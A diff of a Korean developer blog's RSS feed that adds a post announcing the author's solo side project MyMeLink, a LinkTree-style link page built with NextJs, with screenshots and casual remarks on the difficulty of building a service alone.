@@ -1,4 +1,717 @@
-<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[MHLab blog]]></title><description><![CDATA[MHLab의 개발 블로그]]></description><link>https://elfinlas.github.io</link><generator>GatsbyJS</generator><lastBuildDate>Mon, 24 Oct 2022 15:52:44 GMT</lastBuildDate><item><title><![CDATA[Lets Encrypt 적용하기]]></title><description><![CDATA[이번에 서비스를 개발하고 오픈하면서… 예전에 LetsEncrypt…]]></description><link>https://elfinlas.github.io/letsencrypt/220923_use-letsencrypt/</link><guid isPermaLink="false">https://elfinlas.github.io/letsencrypt/220923_use-letsencrypt/</guid><pubDate>Fri, 23 Sep 2022 15:10:22 GMT</pubDate><content:encoded>&lt;h1 id=&quot;이번에-서비스를-개발하고-오픈하면서&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EC%9D%B4%EB%B2%88%EC%97%90-%EC%84%9C%EB%B9%84%EC%8A%A4%EB%A5%BC-%EA%B0%9C%EB%B0%9C%ED%95%98%EA%B3%A0-%EC%98%A4%ED%94%88%ED%95%98%EB%A9%B4%EC%84%9C&quot; aria-label=&quot;이번에 서비스를 개발하고 오픈하면서 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;이번에 서비스를 개발하고 오픈하면서…&lt;/h1&gt;
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[MHLab blog]]></title><description><![CDATA[MHLab의 개발 블로그]]></description><link>https://elfinlas.github.io</link><generator>GatsbyJS</generator><lastBuildDate>Thu, 27 Oct 2022 16:37:02 GMT</lastBuildDate><item><title><![CDATA[개인 토이 프로젝트 MyMeLink 서비스 오픈]]></title><description><![CDATA[혼자서 만들어보다. 개발을 잠시 내려놓고 다른짓 하다가 문득 생각이 들었다. 한번 서비스를 직접 만들어서 운영해보면 어떻한가? 사실 전부터도 들었던 생각이긴 하지만 실천해보기로 했다. 그 전에 커뮤니티를 하나 만들었었는데 반응형도 안되고 jQuery…]]></description><link>https://elfinlas.github.io/my_project/221028_introduce-mml/</link><guid isPermaLink="false">https://elfinlas.github.io/my_project/221028_introduce-mml/</guid><pubDate>Fri, 28 Oct 2022 00:11:01 GMT</pubDate><content:encoded>&lt;p&gt;&lt;span
+      class=&quot;gatsby-resp-image-wrapper&quot;
+      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 1200px; &quot;
+    &gt;
+      &lt;span
+    class=&quot;gatsby-resp-image-background-image&quot;
+    style=&quot;padding-bottom: 66.66666666666666%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAAsTAAALEwEAmpwYAAADmElEQVQ4yz2S61OUZRiH3z2wLCc5BYJhUCmOKdVEUGaIh2Q0mQYogkjOAbGAcTBCYI1BdnVZdwUDYdslWE674LocxUWRFWg42oClfMim6Wt/xdUbTn34zfPhmbnm+t33LUTFv0HEW2EcycwiVW3jvHaSio4HNA+tcmvmGdcdy2hGN9A6t+hyPaVtchOjc53si+V8c6WFnyYWyWm0cKKolQ9zNQgf52Vx6GQMCTn5JH9nJrNlgkLDPSpNj2gcWKHJ9pj6gVUahze4NrZJt+sJFtcW3VOrNFjmyL8yRJKqnYQCPQeOZyB8rTGRmJFMYqmWTO0UWVcnKDC6UHXOU2VZorrnZ2qtK6jtG6ht6+jHf8Hu/g3T5CpfNNs4V20msUDLB9nNRBx+E6FKb+GSXsMFfTe5xvsUtbuoMLmptCxSP7jCVcdjDJNPaBrZELPO97ZlbjhXqTfPktbQT3K1hXdTSnn5YAx+wf5i5fw8ag1m+ifuctm6QM71u5R3z3N5aJk7y8/Z/utvFjd/Z3rtOXXWJWrMD6nunqXEOE56o3WnbvSR0yh9ZEikAsKBo9EkZX1Ge4+Z0YVtsnVjNPS5GXQ/4+HWn8ytP0V9y0H/9BLTK9vUinMrNopz1t0m7VIvZ6t62P/+aeQKQYwcIfzgbhJSP6Fz+DaGrjYKa1QMTs+y/OsfOBa2uNI3i8bspL7dhntti37XOoWtd8hqGuSjklbiUlQi8BS+gUokMglCcFQAhxJiOZqWzqdFBZhHJzE55jA757He20DVNo62dwbr2AOu9U5RdXOMAp2TM6U6XnolEt8AT0IixTfIE7mnCAzdF07Y68Hs2b+HYylnqb9homNknpmFNdH0PnqbG5XBgbZnijK9nVyNjS+bBohNSsE/yAsPTxkKLzkysbKHlxRBqpAhV8rxC1Xw9ql4Uorz+bxGTWpRNhd1RtSWWcqMDqraHHylHaZYN0KRmLiTSfgH+4g1xUVIXmSnsoe3Ag9vGd5BSvbGRBF7Lom4M/GkV9aR1zJEXaeTmptOcpoHRUMbLaJprqqCsMgw0UiU8fx3uyJIInkB9g0NR+HrLX4q2BWiJPQ1H6Lf2UtGeRnfttvRm0fQdg3TYhnHPvOIth/7iNoXSUBwIH7+u5B6CEjlkv8tBZmXUgR64Re2G/+IQEJeVXD4eBxpJefJv5CJoWeU6pYfMFjsWJ0zaDp6ee9YIhK5gEwuFU9FtgP9D/gPp+9EsHWv1AgAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
+  &gt;&lt;/span&gt;
+  &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        alt=&quot;DSC08658&quot;
+        title=&quot;DSC08658&quot;
+        src=&quot;/static/d8fd271cd7b2afdf87433e8c0c027608/c1b63/DSC08658.png&quot;
+        srcset=&quot;/static/d8fd271cd7b2afdf87433e8c0c027608/5a46d/DSC08658.png 300w,
+/static/d8fd271cd7b2afdf87433e8c0c027608/0a47e/DSC08658.png 600w,
+/static/d8fd271cd7b2afdf87433e8c0c027608/c1b63/DSC08658.png 1200w,
+/static/d8fd271cd7b2afdf87433e8c0c027608/29007/DSC08658.png 1600w&quot;
+        sizes=&quot;(max-width: 1200px) 100vw, 1200px&quot;
+        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
+        loading=&quot;lazy&quot;
+      /&gt;
+    &lt;/span&gt;&lt;/p&gt;
+&lt;h1 id=&quot;혼자서-만들어보다&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%ED%98%BC%EC%9E%90%EC%84%9C-%EB%A7%8C%EB%93%A4%EC%96%B4%EB%B3%B4%EB%8B%A4&quot; aria-label=&quot;혼자서 만들어보다 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;혼자서 만들어보다.&lt;/h1&gt;
+&lt;p&gt;개발을 잠시 내려놓고 다른짓 하다가 문득 생각이 들었다.&lt;br&gt;
+&lt;strong&gt;한번 서비스를 직접 만들어서 운영해보면 어떻한가?&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;사실 전부터도 들었던 생각이긴 하지만 실천해보기로 했다.&lt;br&gt;
+그 전에 커뮤니티를 하나 만들었었는데 반응형도 안되고 &lt;strong&gt;jQuery&lt;/strong&gt;라는 고대 유물로 개발을 해서 그런지 엉망이었다.&lt;/p&gt;
+&lt;p&gt;무튼 첫 커뮤니티는 Spring boot와 java8을 이용해 백엔드를 구현하고, 프론트? 라고 하기엔 유감스러울 정도인 화면단은 Thymeleaf로 만들었었다.&lt;/p&gt;
+&lt;p&gt;그러다가 문뜩 &lt;strong&gt;LinkTree&lt;/strong&gt;라는 서비스를 보고 생각이 들었다.&lt;br&gt;
+&lt;strong&gt;이걸 내가 직접 구현해보면 어떨까?&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;만들고 싶었던 이유는?&lt;br&gt;
+그냥 나도 저런거 금방 만들 수 있을거 같은데?&lt;br&gt;
+라는 무모한 생각과 더불어 NextJs를 한번 공부해볼 요량을 만들게 되었다.&lt;/p&gt;
+&lt;p&gt;그렇다…&lt;br&gt;
+뭐든지 쉽게 생각하면 안된다.&lt;/p&gt;
+&lt;p&gt;마치 주식 시장에서 외국인 수급이 들어오면 이 주식이 드디어 가는구나…&lt;br&gt;
+미친 횡보를 마치고 드디어 움직이는구나…&lt;/p&gt;
+&lt;p&gt;내가 공부해본 바에 의하면 이 택지 개발과 재개발로 인해 저평가구나!&lt;br&gt;
+옳거니! 가즈아!!!&lt;/p&gt;
+&lt;p&gt;&lt;span
+      class=&quot;gatsby-resp-image-wrapper&quot;
+      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 525px; &quot;
+    &gt;
+      &lt;span
+    class=&quot;gatsby-resp-image-background-image&quot;
+    style=&quot;padding-bottom: 76.66666666666666%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAAsSAAALEgHS3X78AAADxUlEQVQ4y02U228bVRDGV7SPqLnZXtvrXXttZ32/3xPf4msSO3Gi2EmdpilKm1atmqJSigSUVrQUiYdSKkQLUgFVIFVC8ACv9Il/7Me0EqhHGs3R0Tkz33zzzVHGnSjDqo9GTiW6uEA4sEAl5aKe9+FQF8TshMM+4hGDXCrIsJ1j1CswaBVZzoeIhAzSmSiJZAjD60a5Mk5x6yDN0VaA9ZqHUdPLWtUgGnahulXsqpNY1MfeWpZYRGO8nuPO1T43Dntc2e/SbRfpdaril8jlwyiNkoe1ui6mMelbHO/E8Rk25u02zICXRjHDtXGTF7eHfHGhQiahc3JY4+KkxHu7dTYHNYarTQb9OtVKHGXYiTFY0dlfD3J+02K6HsE0VSnVQSEdZdKq8NnRFr/dP+DPexvstGPcPO5y61Kbi9Mqm8MaO6Meo0GTVj2Fsr+R5FjKvj5NcjiKcLSTpCb82YW7aj5Bq5igv5Tk1l6Tj3Yr3L/S5cGHI+6c9Ll8rsa2BNyfDBhvrNBrplH+eXmbV7/c4I+nxzz/6hy/Pz3k+YMxyYjJSjnNpF1m0sxxslHhyaUVXj7c468XN/j1yQUefzriYNJgOl5jd6NOv5FE+e7+lB8eTvn23pRv7u7x+O6Y94869CpCRb3AWeFmtVrkeFDi0aUOzz7Z5fOPL3D72ohzO2VKxShrvWW2V8usLEtTuktBNtsJtrpJRu04nYqF6XORXNToSrnLmQSpaJhhPcMHOwVuHrzmbp3pVot02hIl2KQhVXYHFakoiBISfQVMB4Y2h6nNo7tm0Tx2ogEn6ZBJu5iiX4jRzIa4PspKEpOrZ1t8/eCEH7//kp9+fsSgU2Srl6dZCqAsBtyYnteBbOiSza/bCARdTDbKlLMW+bjFWdHa48st9qSSoYg65VcpeGbZXo7z6u+XgrDIajNOtehHMd1zBDS7oLMT1O34xDvVeXK5GEuFKH7TpJQJ0xKNaZoDK+InEdGJelWKpo1+fpF6PUu7kSaTNFE8rnksQ31zIeR1EpR9TlD7dAcew8XWSpF753tc3m7J+Fm4PCppeZj0O2lGNXazOrWUKGIpRqNsoThtZzgz8y6afRafYx6bbRbdLqhdC8zJ2WopxpHwcyAzHJbJmbPNCVI7LrnjV2eI6wvEPAtY7nkyQSeKLP6zmdkZ2s0Gbqdkr1UFUZh8Jou1GJJGGQQDAaxgUEbTi1c3MAxDKPHzzqnTvBXnrYAzZ+T3CGHJw2QizqL4eDhMTM5ckkT3aHjc7jd7p6qKOdDcLk6fOvV/jH8BaWrxw1HxAtUAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
+  &gt;&lt;/span&gt;
+  &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        alt=&quot;img01&quot;
+        title=&quot;img01&quot;
+        src=&quot;/static/68eec9695cf87b00458bae3e62d80294/52211/img01.png&quot;
+        srcset=&quot;/static/68eec9695cf87b00458bae3e62d80294/5a46d/img01.png 300w,
+/static/68eec9695cf87b00458bae3e62d80294/52211/img01.png 525w&quot;
+        sizes=&quot;(max-width: 525px) 100vw, 525px&quot;
+        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
+        loading=&quot;lazy&quot;
+      /&gt;
+    &lt;/span&gt;&lt;/p&gt;
+&lt;br&gt;
+&lt;p&gt;&lt;font color=&quot;red&quot;&gt;&lt;b&gt;이렇게 하면 망한다…&lt;/b&gt;&lt;/font&gt;&lt;br&gt;
+&lt;strong&gt;시장은 절대 만만하지 않다&lt;/strong&gt;&lt;br&gt;
+다들 남의 돈 어떻게 뺏을까 궁리하는 놈들 천지인데 ㅎㅎ&lt;/p&gt;
+&lt;p&gt;물론 개발도 그렇다…&lt;br&gt;
+그렇다 나도 MyMeLink 서비스를 개발하면서 이거 쉽게 볼게 아니었구나 싶었다.&lt;/p&gt;
+&lt;p&gt;역시 혼자서 기획하고, 디자인 짜고, 백엔드 개발하고, 프론트 와꾸 짜고 하는거…&lt;br&gt;
+이거 쉽게 보면 안되는거다…&lt;/p&gt;
+&lt;p&gt;무튼 각설하고 서비스 링크는 아래와 같다.&lt;br&gt;
+&lt;a href=&quot;https://myme.link&quot;&gt;https://myme.link&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;이름은 나야나 링크 이런 느낌이다.&lt;br&gt;
+사실 뭐로 할까 하다 생각이 안나서 즉흥적으로 지었다.&lt;/p&gt;
+&lt;p&gt;&lt;span
+      class=&quot;gatsby-resp-image-wrapper&quot;
+      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 1200px; &quot;
+    &gt;
+      &lt;span
+    class=&quot;gatsby-resp-image-background-image&quot;
+    style=&quot;padding-bottom: 80%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAAsTAAALEwEAmpwYAAAChElEQVQ4y61S3U4TQRjtC/kOvoI3PoE+gdEbiRf+JMaQqBFIlCZcmCCRCzGRGDUmpEBbK4VCtwVK/1hgW6hSutvtdqczc5yfZekut04yuzPffHPmnO98CUIILOsEpnmIeq2KdquFI9PE2WkbrZalYrXqgYodVPZhHjZx2GyomFzLu9bJCTjnkCMxcF2UjCKM4jbyGzlURaL8l0sGdsslbPz+hWxmHcWdbWTT6yq3sJlHLptBYSuv4jXxaAiI/zgkaEJ+GGPhlO8Q28Go21XryzilVO37VgftJ6/AfAIW3OViXo4E19AhZUYZ2vcnYD9+Di7qSxkVl+SZPvcGBJVUWeTRkBUfu5/Qi8ugZuh9/QH/8zIw8sVuoBKPXIauz69JRPgUrmqo47FkMf/2hsgZHaQMG/V9G8e2lkaFihAsBhoylKq6zh68YUPoBlJ7Dh7MH+Pu2zperno4OhuKWnEMR3xM6hVQDJBhKNRt1T+ha6+pg+yBjZlNYLEGJEvA9/Qp/qTqoGM1D8hFJauDYNP3PHGqZfX6PqbWXKw0gW1LABc89M69kE9cKo/UUJb+6Qs4zybRE+tOn4KIOi0VHCyVOdYMYDZPsXPsa6dptH6ImyKHeW8ClclpSA49T7dEyXTxOkMwLyTPFjiWDU/1HmFRlohLVs4FAUq4MCboOW+EZKaPj3vAwi4wl/dhu6OouzHQhHIqcHohfYGbUzZuLVI4oueIz/CtKMzZYHgvZM/kOXINXUfZ7OOgEZdpIOH2uw7ufPHxKMPwoazNqVgDvMn4SO4AkyuuaifC+LXmRhRQB9OVEW7MEDxcZ9g81ax9x8X0z3MkVy/QbLkq1xZlcTwGd8iuMfwHjF289It80yMAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
+  &gt;&lt;/span&gt;
+  &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        alt=&quot;img02&quot;
+        title=&quot;img02&quot;
+        src=&quot;/static/c64a3137785cb1ca39022f21c58c9f18/c1b63/img02.png&quot;
+        srcset=&quot;/static/c64a3137785cb1ca39022f21c58c9f18/5a46d/img02.png 300w,
+/static/c64a3137785cb1ca39022f21c58c9f18/0a47e/img02.png 600w,
+/static/c64a3137785cb1ca39022f21c58c9f18/c1b63/img02.png 1200w,
+/static/c64a3137785cb1ca39022f21c58c9f18/c2d9c/img02.png 1326w&quot;
+        sizes=&quot;(max-width: 1200px) 100vw, 1200px&quot;
+        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
+        loading=&quot;lazy&quot;
+      /&gt;
+    &lt;/span&gt;&lt;/p&gt;
+&lt;br&gt;
+&lt;p&gt;서비스 메인 화면이다.&lt;br&gt;
+로티파일인가로 일단 대강 장식해뒀고…&lt;/p&gt;
+&lt;br&gt;
+&lt;p&gt;&lt;span
+      class=&quot;gatsby-resp-image-wrapper&quot;
+      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 1200px; &quot;
+    &gt;
+      &lt;span
+    class=&quot;gatsby-resp-image-background-image&quot;
+    style=&quot;padding-bottom: 63.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAAsTAAALEwEAmpwYAAACjUlEQVQ4y3WS20sUURzH572gh6AXDULJCxVU4HvRU4Sw9BD0H/QfKEaU0uWlF4mEgigs0ZJWdza0jB7ctHTTsqK22rbW3fbi7o47u3PZmTmXb+fMqmHqDz5zzpnD+ZzvzDmKYZqglELXTFhGDY7rQhbnfFsgW8awXpzLPgclLjxCoFiWB8o4CGEglAk5E9P+um1h8iEqX3LwOZbGj0QaS19SyBYs/71iGzao64CROtRzwMVujLrg1NsEE3OyfidimB08jYWRTowNnMf74VOIDAbwM/4dCqnmALsIbhbArXXE2MiBV7OboHoaIBbmpsfgTu5CMnwSV7ouoDC2D6WJNszMRKA4ZgXcs0Wq2gbEscCMvC9hQrwOrUihicXZMCoTjbBeHUHicQf4dDNSoeOIzr8VwlJSLMz4sMofH1JOgclUUrTW8g2hJYQq9GcN8F60wAkfBHvZhHToKObn3kCpaCuwKxpoTSR1DR9i66BVKREJq7ntheEGGKOHsDpyGFW1HWn1WD1hsaQhl03DtqyN60LE8dNqvi40/heavnB1fD+c520wwu0gU83IqB1YXIhCcfUs4GlAreSnkv/O1tKiv9Mn14Xakwa4agvMp62g6gFkgkK4+A7K+Mh9PLrbj3ziI0DLgJUXp76yReYL9X+HEu/Zi+TFViR725HqaUL0Uis+LM1DuXG1D2fPnEBkKgSrmEJhOSb4JtJk1qRb/2E0EkQpuAfOZCP0YJM4nEYsD+1GdHoYytC9fjy41Ys7A7fR3dOHa9dvoqv7MsqZuJ+WCbFMKvGFbhlJebGHAvgaCmBp9BxiagCvH3biV/wTFHim2FXcvZqBmqHDFjjW2t3cAVm6WJbXXBTLrt/Ksay/7aKdcsOvQtcAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
+  &gt;&lt;/span&gt;
+  &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        alt=&quot;img03&quot;
+        title=&quot;img03&quot;
+        src=&quot;/static/8c99e9e8563d10c0e867d2cc9fc33f52/c1b63/img03.png&quot;
+        srcset=&quot;/static/8c99e9e8563d10c0e867d2cc9fc33f52/5a46d/img03.png 300w,
+/static/8c99e9e8563d10c0e867d2cc9fc33f52/0a47e/img03.png 600w,
+/static/8c99e9e8563d10c0e867d2cc9fc33f52/c1b63/img03.png 1200w,
+/static/8c99e9e8563d10c0e867d2cc9fc33f52/d0fa6/img03.png 1263w&quot;
+        sizes=&quot;(max-width: 1200px) 100vw, 1200px&quot;
+        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
+        loading=&quot;lazy&quot;
+      /&gt;
+    &lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;사용자 페이지를 꾸미는 부분이다.&lt;br&gt;
+UI가 좀 허접하다.&lt;br&gt;
+이 부분은 향후 개선을 많이 해봐야 할 부분이다.&lt;/p&gt;
+&lt;p&gt;&lt;span
+      class=&quot;gatsby-resp-image-wrapper&quot;
+      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 1200px; &quot;
+    &gt;
+      &lt;span
+    class=&quot;gatsby-resp-image-background-image&quot;
+    style=&quot;padding-bottom: 77.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAAsTAAALEwEAmpwYAAAChklEQVQ4y3WUT08TURTF5xuYiIkRCQsVEhAXxoUr9YuYmBjCh3Djzp0kGgkmbmShGLRYjYQU2oCIlipFWRiNCaRoqVC07cy8efOm8+d47xumlFhecjrz5s95v3PvmxpSSijpwao7UEohCALwiKKoo5J79ItkhGGg50p5MNBhHGV2YBohoENl10R1r45yZQ+/qyZCumZ8WStitVDE+tpnUhHfv33VlPxiGP5vFtMAhbkHWHl8GanRq5gdu4L8xDWsf8rCyMy8xtLCPBZzc+Dz5bcL8H2/I2l8zQffXZm6DrzvwuTtE1h7dJLOe7GUmYgjB0TiB2FbTUJN6boSjiMgpQOH5JLqogZJj66+HIGfOwXzzQBkpg8yew4fcpMwbNtGwzRRbzRgWbam41gHho42ZFmWie3tMtwmUEwPQ810w34xBPFqECLDhk9gcJebzWYrItMlUsrdN5P6qGiBFuH0MGS6G+bUEGqp8zBn+vBx8RkMIYQm45eYql06KkVOYpuUpFz+pQk5spc9DXd+ACrbDzfXj9V3z2G4rgshHNi20KRRdJiQYydS9CwTutyUiZuo3ulC9f4F/Lk3iPLdXuQXUjC4Rmxmi1hxDWNDpk4IWQmhpDYXnt7A3tgx7Dw8i93xM6iMH0d+dpRqSCtrMzK1qEGepoz3WyfCml2Doh20nL6FzekebKYuoZS+iB9TPbQ3x/YJOTLX0o6NuQRJI9oJdZcrFb2olAqlzQ383CKVNrBVKkF5Pgz+fhM1/aZuBsdmHRC6Wkz416pTUxSOGgbHrNUb8T6kc+HEtAmhEBbJ1mLCneoOkajWBxC1i0pl6C2y/2W008VzvzVneZ5HjbEQ+EHbv87h8Q/EEVJ3SGJFkQAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
+  &gt;&lt;/span&gt;
+  &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        alt=&quot;img04&quot;
+        title=&quot;img04&quot;
+        src=&quot;/static/b6f67f7b2bb1b81c5684b1d0716335fe/c1b63/img04.png&quot;
+        srcset=&quot;/static/b6f67f7b2bb1b81c5684b1d0716335fe/5a46d/img04.png 300w,
+/static/b6f67f7b2bb1b81c5684b1d0716335fe/0a47e/img04.png 600w,
+/static/b6f67f7b2bb1b81c5684b1d0716335fe/c1b63/img04.png 1200w,
+/static/b6f67f7b2bb1b81c5684b1d0716335fe/e8e04/img04.png 1270w&quot;
+        sizes=&quot;(max-width: 1200px) 100vw, 1200px&quot;
+        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
+        loading=&quot;lazy&quot;
+      /&gt;
+    &lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;여기는 링크 추가하는 부분인데 아직 아이콘, 그리고 이미지 전용 버튼 QR 등등 기획한 기능 전부가 들어가지는 않았ㅇ다.&lt;br&gt;
+(혼자서 다 구현하는건 역시 고된 일이다…)&lt;/p&gt;
+&lt;br&gt;
+&lt;p&gt;&lt;span
+      class=&quot;gatsby-resp-image-wrapper&quot;
+      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 1200px; &quot;
+    &gt;
+      &lt;span
+    class=&quot;gatsby-resp-image-background-image&quot;
+    style=&quot;padding-bottom: 85.33333333333334%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAARCAYAAADdRIy+AAAACXBIWXMAAAsTAAALEwEAmpwYAAADRElEQVQ4y4WUy28bVRjF5y9gUQSLUhWoqpaKihUL2KMi6CLtiooVLBCgIgECISq1iCAlYtGkQaLQsEhK65AYuXk0TqImJEBMklZNAQOKGz9iO34mGU/cFL9n/OO7YzsyYMSVj7/RnTvnnnO+uaNlszsUCkWKhTLZTI5SqYRpmqhRrVb/hcY8VYvGqFpqvUm5XELbXSi/cskklytRKZv2nNWC0LJqpKaUYHSbUCRFIJzGH9apyB6aYWS5d2/HRrFYppBXO1lNSqhDEapioe4uTl5g+ZvnGP/qZSZ6T/KL83lmR7vRVv0hAmtRAsEwesaw5ZfFdqkF1DxCJ+mweOWY/O2h/8JbDHQ8C3ceYrLvFbR4LMZ6KEg6nSZrZEht6mzoBlu6zpZskDEMNvWMXVPpDclacpbIbg6ehB/3ERl+huTYU0J+gGnHabQVt4O+117E0/0+zg9fZbb3U9znzzD+eSczn53F2fEenv4uHOdO4/1pVrKzKFbg1mAb1sw+CtcPk79+CDwHuHH1DTTf7BiO9ndZ6DuPq/tjRi518XXnGUYv9zLefxG3y8nC1CiOnk5+XpyXRplI1NwaaqM8sR9j6Cj6t0epzB3mu4E3hfDOTa52fcLCtJvBL3tIb9Vtb+lsimWV64ZYVvZTEkshX7O8NHCCyo39/Ok+wv2JJ2DuID843xbLtxfp7TjL8vycqBkimYiTSCRIxOM24vWaSKjrmGSYpyRtXrrShjm2l9y1Q+RcB2HqcSF8By0ai5OVV8bYzqJL8MlkUpCo1xrUBqoq8qIoFMfM9xwn/sHDRNqfJPLRERLnHmH8i9dF4YoP14ibX72/2w/GYjVVDTTIdgmVQrHsuXyM0tQDGCOPCR7FnHmQ6YtPo4XDEeY9S/jurpJKpWyCeF1VA82EKkM1Fia78bpewHvtlOAl/hg+zvfD7WiBQBC/P7CrTiEZiRBfX5frmE3STJjP52unSGDsVNm+b9nI7Fj2nKYeWlsLEwyG7BoKrbF5e5mYz8fdQIhwONyasOnj0PSVQFsXRZFo1F6syG2Lqtbza7b9d8JqS2h+72/4fav20TIymVpXmzrcjH8SthqaymtDmqHL2VXYfU3+oyn/R/gXGmSwDgbpaLwAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
+  &gt;&lt;/span&gt;
+  &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        alt=&quot;img05&quot;
+        title=&quot;img05&quot;
+        src=&quot;/static/e808ccd76833c1b10d6d2c2b3eb436de/c1b63/img05.png&quot;
+        srcset=&quot;/static/e808ccd76833c1b10d6d2c2b3eb436de/5a46d/img05.png 300w,
+/static/e808ccd76833c1b10d6d2c2b3eb436de/0a47e/img05.png 600w,
+/static/e808ccd76833c1b10d6d2c2b3eb436de/c1b63/img05.png 1200w,
+/static/e808ccd76833c1b10d6d2c2b3eb436de/b5dee/img05.png 1237w&quot;
+        sizes=&quot;(max-width: 1200px) 100vw, 1200px&quot;
+        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
+        loading=&quot;lazy&quot;
+      /&gt;
+    &lt;/span&gt;&lt;/p&gt;
+&lt;br&gt;
+&lt;p&gt;여긴 사용자 페이지를 꾸미는 부분인데…&lt;br&gt;
+정말 UI 디자인을 배워서라도 다시 해보고 싶다.&lt;br&gt;
+내가 봐도 너무 투박한 티가 나서…&lt;br&gt;
+이 부분은 조만간 개선할 예정이다.&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;span
+      class=&quot;gatsby-resp-image-wrapper&quot;
+      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 918px; &quot;
+    &gt;
+      &lt;span
+    class=&quot;gatsby-resp-image-background-image&quot;
